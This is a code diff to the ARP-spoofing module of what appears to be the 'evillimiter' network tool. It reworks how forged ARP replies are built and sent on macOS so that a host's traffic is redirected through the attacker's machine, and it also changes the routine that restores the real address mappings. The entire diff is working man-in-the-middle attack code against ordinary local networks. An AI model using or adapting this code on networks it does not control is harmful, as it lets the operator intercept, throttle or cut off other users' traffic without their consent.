@@ -1,7 +1,7 @@
 import time
 import threading
 import platform
-from scapy.all import ARP, send, get_if_hwaddr # pylint: disable=no-name-in-module
+from scapy.all import ARP, Ether, sendp, send, get_if_hwaddr # pylint: disable=no-name-in-module
 
 from .host import Host
 from evillimiter.common.globals import BROADCAST
@@ -67,19 +67,18 @@ class ARPSpoofer(object):
 
     def _send_spoofed_packets(self, host):
         # 2 packets = 1 gateway packet, 1 host packet
-        # Include hwsrc to avoid Scapy warnings on macOS
-        packets = [
-            ARP(op=2, psrc=host.ip, hwsrc=self.our_mac, pdst=self.gateway_ip, hwdst=self.gateway_mac),
-            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.our_mac, pdst=host.ip, hwdst=host.mac)
-        ]
-
-        # On macOS, suppress interface warnings for L3 operations
+        # On macOS, use Ether layer to avoid warnings, but keep simple approach
         if platform.system() == 'Darwin':
-            import warnings
-            with warnings.catch_warnings():
-                warnings.simplefilter("ignore")
-                [send(x, verbose=0) for x in packets]
+            packets = [
+                Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip, hwsrc=self.our_mac, pdst=self.gateway_ip, hwdst=self.gateway_mac),
+                Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip, hwsrc=self.our_mac, pdst=host.ip, hwdst=host.mac)
+            ]
+            [sendp(x, verbose=0, iface=self.interface) for x in packets]
         else:
+            packets = [
+                ARP(op=2, psrc=host.ip, hwsrc=self.our_mac, pdst=self.gateway_ip, hwdst=self.gateway_mac),
+                ARP(op=2, psrc=self.gateway_ip, hwsrc=self.our_mac, pdst=host.ip, hwdst=host.mac)
+            ]
             [send(x, verbose=0, iface=self.interface) for x in packets]
 
     def _restore(self, host):
@@ -87,16 +86,15 @@ class ARPSpoofer(object):
         Remaps host and gateway to their actual addresses
         """
         # 2 packets = 1 gateway packet, 1 host packet
-        packets = [
-            ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
-            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
-        ]
-
-        # On macOS, suppress interface warnings for L3 operations
         if platform.system() == 'Darwin':
-            import warnings
-            with warnings.catch_warnings():
-                warnings.simplefilter("ignore")
-                [send(x, verbose=0, count=3) for x in packets]
+            packets = [
+                Ether(dst=BROADCAST) / ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
+                Ether(dst=BROADCAST) / ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
+            ]
+            [sendp(x, count=3, verbose=0, iface=self.interface) for x in packets]
         else:
+            packets = [
+                ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
+                ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
+            ]
             [send(x, verbose=0, iface=self.interface, count=3) for x in packets]
